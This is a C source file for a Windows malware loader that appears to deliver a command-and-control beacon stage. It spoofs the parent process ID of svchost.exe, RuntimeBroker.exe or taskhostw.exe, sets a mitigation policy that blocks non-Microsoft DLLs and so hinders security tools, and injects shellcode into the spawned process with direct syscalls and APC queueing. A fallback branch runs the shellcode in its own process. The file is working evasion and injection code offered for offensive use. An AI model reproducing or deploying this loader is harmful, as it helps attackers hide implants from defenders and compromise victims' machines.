#include <stdio.h>
#include <windows.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winternl.h>

#include "loader.h"
#include "syscalls.h"

DWORD GetPID(CHAR* ProcName)
{
    // we will start from lower PIDs which are normally system processes
    // so therefore are a better idea to inject into as will probly stay
    // active for longer.

    DWORD PID               = 0;
    HANDLE tProcess         = NULL;
    DWORD dwProcCount       = 0;
    WTS_PROCESS_INFO* pWPIs = NULL;

    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
    {
        // tuff
        printf("WTSEnumerateProcesses fail\n");
        return NULL;
    }

    for(DWORD i = 0; i < dwProcCount; i++)
    {
        if (strcmp(ProcName, pWPIs[i].pProcessName) == 0)
        {
            tProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);
            if (tProcess)
            {
                return pWPIs[i].ProcessId;
            }
        }
    }

    return NULL;
}

CHAR* GetParentHandle(HANDLE* hProcess)
{
    DWORD Pid, iter;
    HANDLE tProcess;
    CHAR* PreferProcChain[3][2] = {
        { "services.exe", "C:\\windows\\system32\\svchost.exe" },
        { "svchost.exe", "C:\\windows\\system32\\RuntimeBroker.exe" },
        { "sihost.exe", "C:\\windows\\system32\\taskhostw.exe" }
    };

    for (iter = 0; iter < 3; iter++)
    {
        // get PID of parent we want to spoof
        Pid = GetPID(PreferProcChain[iter][0]);
        if (Pid != NULL)
        {
            // use syscall
            tProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
            if (tProcess)
            {
                break;
            }
        }
    }

    *hProcess = tProcess;
    return PreferProcChain[iter][1];
}

void SpawnAndInject(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cThread, CHAR* Stage, DWORD sSize)
{
    // Spawn the new process with ppid spoofing and inject the stage into it.

    SIZE_T attribSize;
    ULONG oProc, nProc;
    STARTUPINFOEXA sInfo;
    LPVOID rBuffer = NULL;
    OSVERSIONINFOEXW osInfo;
    PROCESS_INFORMATION pInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    // zero out our mem just to be safe
    ZeroMemory(&sInfo, sizeof(STARTUPINFOEXA));

    // set up our attributes to expect 2
    InitializeProcThreadAttributeList(NULL, 2, 0, &attribSize);
    sInfo.lpAttributeList = malloc(attribSize);
    InitializeProcThreadAttributeList(sInfo.lpAttributeList, 2, 0, &attribSize);

    // our protection policys
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON | \
                     PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
    UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // ppid spoof
    UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);

    // set the size of the struct
    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    // start the process. TODO: use syscall
    CreateProcessA(ProcessName, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

    // alloc the memory we need inside the process. TODO: use syscall
    rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    // get RtlGetVersion export and call it to get our version info
    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
    RtlGetVersion(&osInfo);
    
    // make sure we are using the correct syscall numbers, probly a nicer way of doing this
    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
    {
        NtQueueApcThread     = &NtQueueApcThread10;
        NtWriteVirtualMemory = &NtWriteVirtualMemory10;
    } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
    {
        NtQueueApcThread     = &NtQueueApcThread81;
        NtWriteVirtualMemory = &NtWriteVirtualMemory81;
    }

    // write our shellcode bytes to the process
    NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Stage, sSize, NULL);

    // change the permisions on the memory so we can execute it
    VirtualProtectEx(pInfo.hProcess, rBuffer, sSize, PAGE_EXECUTE_READWRITE, &oProc);

    // execute the code inside the process
    NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);

    return;
}

VOID ExecuteStage(CHAR* Stage, DWORD sSize)
{
    // execute the stage. If we are in secure mode then lets ppid spoof and launch beacon from there.
    // if we are not then lets drop the shellcode in our current processes.
    HANDLE hProcess;
    CHAR* ChildProcess;
    HANDLE cProc, cThread;

    // if we not running in secure mode then lets just drop the shellcode
    #ifndef SECURE
        // replace this with a syscall
    	void* module = VirtualAlloc(0, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	    memcpy(module, Stage, sSize);
	    ((void(*)())module)();
    #endif

    // if we are in secure mode then lets ppid spoof and inject
    #ifdef SECURE
        // get our the new ppid
        ChildProcess = GetParentHandle(&hProcess);

        // spawn the ppid spoofed process
        SpawnAndInject(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize);
    #endif

    return;
}